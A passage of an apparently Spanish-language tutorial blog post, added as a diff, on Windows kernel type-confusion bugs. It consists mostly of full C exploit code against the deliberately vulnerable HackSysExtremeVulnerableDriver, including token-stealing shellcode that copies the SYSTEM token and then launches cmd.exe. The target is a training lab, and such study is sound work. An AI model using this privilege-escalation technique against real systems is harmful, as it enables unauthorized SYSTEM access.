+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x64\x8b\x80\x24\x01\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// mov eax, dword ptr fs:[eax + 0x124]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x40\x50</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov eax, dword ptr [eax + 0x50]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xc1</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// mov ecx, eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xba\x04\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>         <span style="color:#75715e">// mov edx, 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x80\xb8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>     <span style="color:#75715e">// mov eax, dword ptr [eax + 0xb8]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2d\xb8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>         <span style="color:#75715e">// sub eax, 0xb8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\x90\xb4\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>     <span style="color:#75715e">// cmp dword ptr [eax + 0xb4], edx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\xed</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// jne 0x1014
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x90\xf8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>     <span style="color:#75715e">// mov edx, dword ptr [eax + 0xf8]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\x91\xf8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>     <span style="color:#75715e">// mov dword ptr [ecx + 0xf8], edx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x61</span><span style="color:#e6db74">&#34;</span>                         <span style="color:#75715e">// popal
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Return to Userland */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc3</span><span style="color:#e6db74">&#34;</span>;                        <span style="color:#75715e">// ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  lpvMemoryAllocation <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL,
+</span></span><span style="display:flex;"><span>                                     <span style="color:#ae81ff">53</span>,
+</span></span><span style="display:flex;"><span>                                     (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
+</span></span><span style="display:flex;"><span>                                     PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvMemoryAllocation <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to allocate memory for shellcode</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocated memory for shellcode, shellocode @{0x%p}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvMemoryAllocation);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(lpvMemoryAllocation, shellcode, <span style="color:#ae81ff">53</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectType <span style="color:#f92672">=</span> (ULONG)lpvMemoryAllocation;
+</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectID <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41414141</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering type confusion</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  HEVD_IOCTL_TYPE_CONFUSION,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>UserTypeConfusionObject,
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">sizeof</span>(UserTypeConfusionObject),
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">CheckWin</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Exploit</span>(hHEVD) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Exploitation successful, enjoy de shell!!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Exploitation failed, run again</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">!=</span> INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hHEVD);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Una vez enviado, obtenemos la ejecución del código :)</p>
+<p><img src="/0x05-Introduction-to-Windows-Kernel-Type-Confusion-Vulnerabilities/exploit.gif" alt="alt text"></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
